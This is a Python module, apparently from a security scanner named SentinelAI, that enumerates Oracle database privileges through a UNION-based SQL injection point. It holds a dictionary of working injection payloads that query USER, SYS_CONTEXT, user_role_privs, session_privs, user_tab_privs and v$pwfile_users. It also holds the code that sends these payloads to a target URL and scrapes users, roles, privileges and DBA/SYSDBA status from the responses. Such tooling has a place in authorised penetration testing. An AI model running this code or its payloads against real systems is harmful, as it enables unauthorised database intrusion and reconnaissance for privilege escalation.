# app/modules/scanner/oracle_privileges.py
"""
Oracle privilege enumeration for SentinelAI.
Phase 5: Oracle Privilege Enumeration
"""

import logging
import re
from dataclasses import dataclass, field
from typing import Optional, Dict, List, Any, Set
import requests

from .union_sqli import UnionSQLi
from .html_parser import HTMLParser
from .regex_utils import RegexUtils
from .signatures import OracleSignatures

# ============================================================
# Data Classes
# ============================================================


@dataclass
class OraclePrivilegeResult:
    """
    Oracle privilege enumeration result.
    Contains all enumerated privilege information.
    """

    success: bool = False
    current_user: Optional[str] = None
    current_schema: Optional[str] = None
    session_user: Optional[str] = None
    database_user: Optional[str] = None
    user_id: Optional[int] = None
    authentication_type: Optional[str] = None
    default_tablespace: Optional[str] = None
    temporary_tablespace: Optional[str] = None
    profile: Optional[str] = None
    account_status: Optional[str] = None

    # Roles
    roles: List[str] = field(default_factory=list)
    session_roles: List[str] = field(default_factory=list)
    granted_roles: List[str] = field(default_factory=list)

    # Privileges
    system_privileges: List[str] = field(default_factory=list)
    session_privileges: List[str] = field(default_factory=list)
    object_privileges: List[Dict[str, str]] = field(default_factory=list)
    user_privileges: List[str] = field(default_factory=list)

    # DBA status
    is_dba: bool = False
    is_sysdba: bool = False
    is_sysoper: bool = False

    # Raw data for debugging
    raw_responses: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def add_error(self, error: str):
        """Add an error to the result."""
        self.errors.append(error)

    def add_role(self, role: str):
        """Add a role to the result."""
        role_upper = role.upper().strip()
        if role_upper and role_upper not in self.roles:
            self.roles.append(role_upper)

    def add_session_role(self, role: str):
        """Add a session role to the result."""
        role_upper = role.upper().strip()
        if role_upper and role_upper not in self.session_roles:
            self.session_roles.append(role_upper)

    def add_system_privilege(self, privilege: str):
        """Add a system privilege to the result."""
        priv_upper = privilege.upper().strip()
        if priv_upper and priv_upper not in self.system_privileges:
            self.system_privileges.append(priv_upper)

    def add_session_privilege(self, privilege: str):
        """Add a session privilege to the result."""
        priv_upper = privilege.upper().strip()
        if priv_upper and priv_upper not in self.session_privileges:
            self.session_privileges.append(priv_upper)

    def add_object_privilege(self, privilege: Dict[str, str]):
        """Add an object privilege to the result."""
        self.object_privileges.append(privilege)

    def get_summary(self) -> str:
        """Get a summary of the privilege enumeration result."""
        if not self.success:
            return "Privilege enumeration failed"

        parts = []

        if self.current_user:
            parts.append(f"User: {self.current_user}")

        if self.roles:
            parts.append(f"Roles: {len(self.roles)}")

        if self.system_privileges:
            parts.append(f"System Privs: {len(self.system_privileges)}")

        if self.session_privileges:
            parts.append(f"Session Privs: {len(self.session_privileges)}")

        if self.object_privileges:
            parts.append(f"Object Privs: {len(self.object_privileges)}")

        if self.is_dba:
            parts.append("DBA")

        if self.is_sysdba:
            parts.append("SYSDBA")

        if self.is_sysoper:
            parts.append("SYSOPER")

        if self.errors:
            parts.append(f"Errors: {len(self.errors)}")

        return (
            f"Privileges: {', '.join(parts)}" if parts else "Privileges: No data found"
        )

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for logging/output."""
        return {
            "success": self.success,
            "current_user": self.current_user,
            "current_schema": self.current_schema,
            "session_user": self.session_user,
            "database_user": self.database_user,
            "user_id": self.user_id,
            "authentication_type": self.authentication_type,
            "default_tablespace": self.default_tablespace,
            "temporary_tablespace": self.temporary_tablespace,
            "profile": self.profile,
            "account_status": self.account_status,
            "roles": self.roles,
            "session_roles": self.session_roles,
            "granted_roles": self.granted_roles,
            "system_privileges": self.system_privileges,
            "session_privileges": self.session_privileges,
            "object_privileges": self.object_privileges,
            "user_privileges": self.user_privileges,
            "is_dba": self.is_dba,
            "is_sysdba": self.is_sysdba,
            "is_sysoper": self.is_sysoper,
            "errors": self.errors,
            "summary": self.get_summary(),
        }


# ============================================================
# Main Privilege Enumeration Class
# ============================================================


class OraclePrivilegeEnumerator:
    """
    Oracle privilege enumeration module.
    Phase 5: Enumerates privileges after successful Oracle detection.
    """

    # ============================================================
    # Constants
    # ============================================================

    # Payloads for privilege enumeration
    PAYLOADS = {
        "current_user": [
            "UNION SELECT USER FROM dual--",
            "UNION SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM dual--",
        ],
        "current_schema": [
            "UNION SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual--",
        ],
        "session_user": [
            "UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER') FROM dual--",
        ],
        "database_user": [
            "UNION SELECT USER FROM dual--",
        ],
        "user_id": [
            "UNION SELECT SYS_CONTEXT('USERENV','USERID') FROM dual--",
            "UNION SELECT USER_ID FROM USER_USERS--",
        ],
        "authentication_type": [
            "UNION SELECT SYS_CONTEXT('USERENV','AUTHENTICATION_TYPE') FROM dual--",
        ],
        "default_tablespace": [
            "UNION SELECT DEFAULT_TABLESPACE FROM USER_USERS--",
        ],
        "temporary_tablespace": [
            "UNION SELECT TEMPORARY_TABLESPACE FROM USER_USERS--",
        ],
        "profile": [
            "UNION SELECT PROFILE FROM USER_USERS--",
        ],
        "account_status": [
            "UNION SELECT ACCOUNT_STATUS FROM USER_USERS--",
        ],
        "roles": [
            "UNION SELECT granted_role FROM user_role_privs--",
            "UNION SELECT role FROM session_roles--",
        ],
        "session_roles": [
            "UNION SELECT role FROM session_roles--",
        ],
        "granted_roles": [
            "UNION SELECT granted_role FROM user_role_privs--",
        ],
        "system_privileges": [
            "UNION SELECT privilege FROM user_sys_privs--",
        ],
        "session_privileges": [
            "UNION SELECT privilege FROM session_privs--",
        ],
        "object_privileges": [
            "UNION SELECT owner, table_name, privilege FROM user_tab_privs--",
        ],
        "user_privileges": [
            "UNION SELECT privilege FROM user_sys_privs--",
        ],
        "dba_check": [
            "UNION SELECT granted_role FROM user_role_privs WHERE granted_role='DBA'--",
        ],
        "sysdba_check": [
            "UNION SELECT username FROM v$pwfile_users WHERE SYSDB='TRUE'--",
        ],
        "sysoper_check": [
            "UNION SELECT username FROM v$pwfile_users WHERE SYSOP='TRUE'--",
        ],
    }

    # Extraction patterns
    EXTRACTION_PATTERNS = {
        "username": r"[A-Z][A-Z0-9_$]{2,}",
        "role": r"[A-Z][A-Z0-9_$]{2,}",
        "privilege": r"[A-Z][A-Z0-9_$]{2,}",
        "tablespace": r"[A-Z][A-Z0-9_$]{2,}",
        "account_status": r"[A-Z][A-Z0-9_]{2,}",
        "object_privilege": r"([A-Z][A-Z0-9_$]{2,})\s+([A-Z][A-Z0-9_$]{2,})\s+([A-Z][A-Z0-9_]{2,})",
    }

    # ============================================================
    # Initialization
    # ============================================================

    def __init__(
        self,
        session: requests.Session,
        base_url: str,
        logger: Optional[logging.Logger] = None,
    ):
        """Initialize Oracle privilege enumerator."""
        self.session = session
        self.base_url = base_url
        self.logger = logger or self._setup_logger()

        self.union_sqli = UnionSQLi(session, base_url, logger)
        self.html_parser = HTMLParser()
        self.regex_utils = RegexUtils()
        self.signatures = OracleSignatures()

        self.baseline_response = None
        self.privilege_result = None

        self.logger.info(
            "[OraclePrivileges] Module initialized for privilege enumeration"
        )
        self.logger.info(f"[OraclePrivileges] Target: {base_url}")

    def _setup_logger(self) -> logging.Logger:
        """Set up default logger."""
        logger = logging.getLogger("OraclePrivileges")
        logger.setLevel(logging.DEBUG)

        if not logger.handlers:
            ch = logging.StreamHandler()
            ch.setLevel(logging.DEBUG)
            formatter = logging.Formatter(
                "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
            )
            ch.setFormatter(formatter)
            logger.addHandler(ch)

        return logger

    # ============================================================
    # Private Methods
    # ============================================================

    def _get_baseline(self, injection_point: str) -> Optional[requests.Response]:
        """Get baseline response for comparison."""
        if self.baseline_response is None:
            self.logger.info("[OraclePrivileges] Fetching baseline response...")
            self.baseline_response = self.union_sqli.get_baseline(injection_point)

            if self.baseline_response:
                self.logger.info(
                    f"[OraclePrivileges] Baseline response length: {len(self.baseline_response.text)}"
                )
            else:
                self.logger.warning(
                    "[OraclePrivileges] Failed to get baseline response"
                )

        return self.baseline_response

    def _send_payload(
        self, injection_point: str, payload: str
    ) -> Optional[requests.Response]:
        """Send a payload and return the response."""
        baseline = self._get_baseline(injection_point)
        result = self.union_sqli.test_payload(injection_point, payload, baseline)

        if not result["success"] or result.get("response") is None:
            return None

        return result["response"]

    def _extract_values(self, text: str, pattern: str) -> List[str]:
        """Extract values from text using regex pattern."""
        if not text:
            return []

        # Find all matches
        matches = re.findall(pattern, text, re.IGNORECASE)

        # Clean and deduplicate
        cleaned = []
        seen = set()
        for m in matches:
            # If match is a tuple (from groups), take first non-empty group
            if isinstance(m, tuple):
                for item in m:
                    if item and item.strip():
                        val = item.strip().strip("'\"")
                        if val and val.upper() not in seen:
                            seen.add(val.upper())
                            cleaned.append(val)
            else:
                val = m.strip().strip("'\"")
                if val and val.upper() not in seen:
                    seen.add(val.upper())
                    cleaned.append(val)

        return cleaned

    def _extract_single_value(self, text: str, pattern: str) -> Optional[str]:
        """Extract a single value from text."""
        values = self._extract_values(text, pattern)
        return values[0] if values else None

    def _clean_value(self, value: str) -> str:
        """Clean extracted value."""
        if not value:
            return value

        value = value.strip()
        value = value.strip("'\"")
        value = value.strip()

        return value

    def _try_payloads(
        self,
        injection_point: str,
        payloads: List[str],
        extract_pattern: str,
        single: bool = False,
    ) -> Any:
        """Try multiple payloads and extract values."""
        for payload in payloads:
            try:
                self.logger.debug(
                    f"[OraclePrivileges] Testing payload: {payload[:50]}..."
                )
                response = self._send_payload(injection_point, payload)

                if response and response.text:
                    # Clean the response text
                    clean_text = self.html_parser.extract_text(response.text)

                    if single:
                        value = self._extract_single_value(clean_text, extract_pattern)
                        if value:
                            return value
                    else:
                        values = self._extract_values(clean_text, extract_pattern)
                        if values:
                            return values
            except Exception as e:
                self.logger.warning(f"[OraclePrivileges] Payload failed: {str(e)}")
                continue

        return None if single else []

    # ============================================================
    # Public Enumeration Methods
    # ============================================================

    def enumerate_current_user(self, injection_point: str) -> Optional[str]:
        """Enumerate current database user."""
        self.logger.info("[OraclePrivileges] Enumerating current user...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["current_user"],
            self.EXTRACTION_PATTERNS["username"],
            single=True,
        )

        if result:
            self.logger.info(f"[OraclePrivileges] Current user: {result}")
        else:
            self.logger.warning("[OraclePrivileges] Failed to enumerate current user")

        return result

    def enumerate_current_schema(self, injection_point: str) -> Optional[str]:
        """Enumerate current schema."""
        self.logger.info("[OraclePrivileges] Enumerating current schema...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["current_schema"],
            r"[A-Z][A-Z0-9_$]{2,}",
            single=True,
        )

        if result:
            self.logger.info(f"[OraclePrivileges] Current schema: {result}")
        else:
            self.logger.warning("[OraclePrivileges] Failed to enumerate current schema")

        return result

    def enumerate_session_user(self, injection_point: str) -> Optional[str]:
        """Enumerate session user."""
        self.logger.info("[OraclePrivileges] Enumerating session user...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["session_user"],
            self.EXTRACTION_PATTERNS["username"],
            single=True,
        )

        if result:
            self.logger.info(f"[OraclePrivileges] Session user: {result}")
        else:
            self.logger.warning("[OraclePrivileges] Failed to enumerate session user")

        return result

    def enumerate_database_user(self, injection_point: str) -> Optional[str]:
        """Enumerate database user."""
        self.logger.info("[OraclePrivileges] Enumerating database user...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["database_user"],
            self.EXTRACTION_PATTERNS["username"],
            single=True,
        )

        if result:
            self.logger.info(f"[OraclePrivileges] Database user: {result}")
        else:
            self.logger.warning("[OraclePrivileges] Failed to enumerate database user")

        return result

    def enumerate_user_id(self, injection_point: str) -> Optional[int]:
        """Enumerate user ID."""
        self.logger.info("[OraclePrivileges] Enumerating user ID...")

        result = self._try_payloads(
            injection_point, self.PAYLOADS["user_id"], r"\b\d+\b", single=True
        )

        if result:
            self.logger.info(f"[OraclePrivileges] User ID: {result}")
        else:
            self.logger.warning("[OraclePrivileges] Failed to enumerate user ID")

        return int(result) if result else None

    def enumerate_authentication_type(self, injection_point: str) -> Optional[str]:
        """Enumerate authentication type."""
        self.logger.info("[OraclePrivileges] Enumerating authentication type...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["authentication_type"],
            r"[A-Z]+",
            single=True,
        )

        if result:
            self.logger.info(f"[OraclePrivileges] Authentication type: {result}")
        else:
            self.logger.warning(
                "[OraclePrivileges] Failed to enumerate authentication type"
            )

        return result

    def enumerate_default_tablespace(self, injection_point: str) -> Optional[str]:
        """Enumerate default tablespace."""
        self.logger.info("[OraclePrivileges] Enumerating default tablespace...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["default_tablespace"],
            self.EXTRACTION_PATTERNS["tablespace"],
            single=True,
        )

        if result:
            self.logger.info(f"[OraclePrivileges] Default tablespace: {result}")
        else:
            self.logger.warning(
                "[OraclePrivileges] Failed to enumerate default tablespace"
            )

        return result

    def enumerate_temporary_tablespace(self, injection_point: str) -> Optional[str]:
        """Enumerate temporary tablespace."""
        self.logger.info("[OraclePrivileges] Enumerating temporary tablespace...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["temporary_tablespace"],
            self.EXTRACTION_PATTERNS["tablespace"],
            single=True,
        )

        if result:
            self.logger.info(f"[OraclePrivileges] Temporary tablespace: {result}")
        else:
            self.logger.warning(
                "[OraclePrivileges] Failed to enumerate temporary tablespace"
            )

        return result

    def enumerate_profile(self, injection_point: str) -> Optional[str]:
        """Enumerate profile."""
        self.logger.info("[OraclePrivileges] Enumerating profile...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["profile"],
            r"[A-Z][A-Z0-9_$]{2,}",
            single=True,
        )

        if result:
            self.logger.info(f"[OraclePrivileges] Profile: {result}")
        else:
            self.logger.warning("[OraclePrivileges] Failed to enumerate profile")

        return result

    def enumerate_account_status(self, injection_point: str) -> Optional[str]:
        """Enumerate account status."""
        self.logger.info("[OraclePrivileges] Enumerating account status...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["account_status"],
            self.EXTRACTION_PATTERNS["account_status"],
            single=True,
        )

        if result:
            self.logger.info(f"[OraclePrivileges] Account status: {result}")
        else:
            self.logger.warning("[OraclePrivileges] Failed to enumerate account status")

        return result

    def enumerate_roles(self, injection_point: str) -> List[str]:
        """Enumerate roles."""
        self.logger.info("[OraclePrivileges] Enumerating roles...")

        roles = self._try_payloads(
            injection_point,
            self.PAYLOADS["roles"],
            self.EXTRACTION_PATTERNS["role"],
            single=False,
        )

        if roles:
            self.logger.info(
                f"[OraclePrivileges] Found {len(roles)} roles: {roles[:10]}"
            )
        else:
            self.logger.warning("[OraclePrivileges] Failed to enumerate roles")

        return roles or []

    def enumerate_session_roles(self, injection_point: str) -> List[str]:
        """Enumerate session roles."""
        self.logger.info("[OraclePrivileges] Enumerating session roles...")

        roles = self._try_payloads(
            injection_point,
            self.PAYLOADS["session_roles"],
            self.EXTRACTION_PATTERNS["role"],
            single=False,
        )

        if roles:
            self.logger.info(
                f"[OraclePrivileges] Found {len(roles)} session roles: {roles[:10]}"
            )
        else:
            self.logger.warning("[OraclePrivileges] Failed to enumerate session roles")

        return roles or []

    def enumerate_system_privileges(self, injection_point: str) -> List[str]:
        """Enumerate system privileges."""
        self.logger.info("[OraclePrivileges] Enumerating system privileges...")

        privileges = self._try_payloads(
            injection_point,
            self.PAYLOADS["system_privileges"],
            self.EXTRACTION_PATTERNS["privilege"],
            single=False,
        )

        if privileges:
            self.logger.info(
                f"[OraclePrivileges] Found {len(privileges)} system privileges: {privileges[:10]}"
            )
        else:
            self.logger.warning(
                "[OraclePrivileges] Failed to enumerate system privileges"
            )

        return privileges or []

    def enumerate_session_privileges(self, injection_point: str) -> List[str]:
        """Enumerate session privileges."""
        self.logger.info("[OraclePrivileges] Enumerating session privileges...")

        privileges = self._try_payloads(
            injection_point,
            self.PAYLOADS["session_privileges"],
            self.EXTRACTION_PATTERNS["privilege"],
            single=False,
        )

        if privileges:
            self.logger.info(
                f"[OraclePrivileges] Found {len(privileges)} session privileges: {privileges[:10]}"
            )
        else:
            self.logger.warning(
                "[OraclePrivileges] Failed to enumerate session privileges"
            )

        return privileges or []

    def enumerate_object_privileges(self, injection_point: str) -> List[Dict[str, str]]:
        """Enumerate object privileges."""
        self.logger.info("[OraclePrivileges] Enumerating object privileges...")

        privileges = []

        for payload in self.PAYLOADS["object_privileges"]:
            try:
                response = self._send_payload(injection_point, payload)

                if response and response.text:
                    # Clean the response text
                    clean_text = self.html_parser.extract_text(response.text)

                    # Extract owner, table, privilege triplets
                    pattern = r"([A-Z][A-Z0-9_$]{2,})\s+([A-Z][A-Z0-9_$]{2,})\s+([A-Z][A-Z0-9_]{2,})"
                    matches = re.findall(pattern, clean_text, re.IGNORECASE)

                    for owner, table, priv in matches:
                        privileges.append(
                            {
                                "owner": owner.upper(),
                                "table": table.upper(),
                                "privilege": priv.upper(),
                            }
                        )
            except Exception as e:
                self.logger.warning(
                    f"[OraclePrivileges] Object privilege enumeration failed: {str(e)}"
                )
                continue

        if privileges:
            self.logger.info(
                f"[OraclePrivileges] Found {len(privileges)} object privileges: {privileges[:5]}"
            )
        else:
            self.logger.warning(
                "[OraclePrivileges] Failed to enumerate object privileges"
            )

        return privileges

    def check_dba(self, injection_point: str) -> bool:
        """Check if user has DBA role."""
        self.logger.info("[OraclePrivileges] Checking DBA status...")

        result = self._try_payloads(
            injection_point, self.PAYLOADS["dba_check"], r"DBA", single=True
        )

        is_dba = result is not None
        self.logger.info(f"[OraclePrivileges] DBA: {is_dba}")

        return is_dba

    def check_sysdba(self, injection_point: str) -> bool:
        """Check if user has SYSDBA privilege."""
        self.logger.info("[OraclePrivileges] Checking SYSDBA status...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["sysdba_check"],
            self.EXTRACTION_PATTERNS["username"],
            single=True,
        )

        is_sysdba = result is not None
        self.logger.info(f"[OraclePrivileges] SYSDBA: {is_sysdba}")

        return is_sysdba

    def check_sysoper(self, injection_point: str) -> bool:
        """Check if user has SYSOPER privilege."""
        self.logger.info("[OraclePrivileges] Checking SYSOPER status...")

        result = self._try_payloads(
            injection_point,
            self.PAYLOADS["sysoper_check"],
            self.EXTRACTION_PATTERNS["username"],
            single=True,
        )

        is_sysoper = result is not None
        self.logger.info(f"[OraclePrivileges] SYSOPER: {is_sysoper}")

        return is_sysoper

    # ============================================================
    # Main Enumeration Method
    # ============================================================

    def enumerate_all(self, injection_point: str) -> OraclePrivilegeResult:
        """Perform complete privilege enumeration."""
        self.logger.info(
            "[OraclePrivileges] =================================================="
        )
        self.logger.info("[OraclePrivileges] PHASE 5: Oracle Privilege Enumeration")
        self.logger.info(
            "[OraclePrivileges] =================================================="
        )

        result = OraclePrivilegeResult()

        try:
            # User Information
            self.logger.info(
                "[OraclePrivileges] Step 1: Collecting user information..."
            )
            result.current_user = self.enumerate_current_user(injection_point)
            result.current_schema = self.enumerate_current_schema(injection_point)
            result.session_user = self.enumerate_session_user(injection_point)
            result.database_user = self.enumerate_database_user(injection_point)
            result.user_id = self.enumerate_user_id(injection_point)
            result.authentication_type = self.enumerate_authentication_type(
                injection_point
            )
            result.default_tablespace = self.enumerate_default_tablespace(
                injection_point
            )
            result.temporary_tablespace = self.enumerate_temporary_tablespace(
                injection_point
            )
            result.profile = self.enumerate_profile(injection_point)
            result.account_status = self.enumerate_account_status(injection_point)

            # Roles
            self.logger.info("[OraclePrivileges] Step 2: Enumerating roles...")
            roles = self.enumerate_roles(injection_point)
            if roles:
                for role in roles:
                    result.add_role(role)

            session_roles = self.enumerate_session_roles(injection_point)
            if session_roles:
                for role in session_roles:
                    result.add_session_role(role)

            # Privileges
            self.logger.info("[OraclePrivileges] Step 3: Enumerating privileges...")
            system_privs = self.enumerate_system_privileges(injection_point)
            if system_privs:
                for priv in system_privs:
                    result.add_system_privilege(priv)

            session_privs = self.enumerate_session_privileges(injection_point)
            if session_privs:
                for priv in session_privs:
                    result.add_session_privilege(priv)

            object_privs = self.enumerate_object_privileges(injection_point)
            if object_privs:
                for priv in object_privs:
                    result.add_object_privilege(priv)

            # DBA Status
            self.logger.info("[OraclePrivileges] Step 4: Checking DBA status...")
            result.is_dba = self.check_dba(injection_point)
            result.is_sysdba = self.check_sysdba(injection_point)
            result.is_sysoper = self.check_sysoper(injection_point)

            result.success = True

        except Exception as e:
            error_msg = f"Privilege enumeration failed: {str(e)}"
            self.logger.error(error_msg)
            result.add_error(error_msg)
            result.success = False

        self.logger.info(
            "[OraclePrivileges] =================================================="
        )
        self.logger.info("[OraclePrivileges] PRIVILEGE ENUMERATION COMPLETE")
        self.logger.info(f"[OraclePrivileges] {result.get_summary()}")
        self.logger.info(
            "[OraclePrivileges] =================================================="
        )

        self.privilege_result = result
        return result

    # ============================================================
    # Convenience Methods
    # ============================================================

    def get_current_user(self, injection_point: str) -> Optional[str]:
        """Get current user only."""
        return self.enumerate_current_user(injection_point)

    def get_roles(self, injection_point: str) -> List[str]:
        """Get roles only."""
        return self.enumerate_roles(injection_point)

    def get_privileges(self, injection_point: str) -> List[str]:
        """Get privileges only."""
        return self.enumerate_system_privileges(injection_point)

    def is_dba(self, injection_point: str) -> bool:
        """Check DBA status."""
        return self.check_dba(injection_point)
